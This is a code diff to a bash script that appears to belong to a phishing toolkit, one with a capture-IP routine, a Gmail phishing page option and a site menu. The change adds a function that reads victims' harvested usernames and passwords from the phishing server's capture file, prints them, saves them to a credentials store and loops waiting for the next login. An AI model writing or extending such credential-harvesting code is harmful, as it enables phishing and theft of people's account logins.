@@ -334,7 +334,16 @@ capture_ip() {
 }
 
 ## Get credentials
-
+capture_creds() {
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+}
 ## Print data
 capture_data() {
 	echo -ne "\n${RED}[${GREEN}+${RED}]${GREEN} Waiting for get ip, ${GREEN}Ctrl + C ${RED}to exit..."
@@ -344,7 +353,14 @@ capture_data() {
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
-		
+		sleep 0.75
+		if [[ -e ".server/www/usernames.txt" ]]; then
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			capture_creds
+			rm -rf .server/www/usernames.txt
+		fi
+		sleep 0.75
+  
 	done
 }
 
@@ -606,7 +622,7 @@ site_gmail() {
 	esac
 }
 
-## Vk
+
 
 
 ## Menu
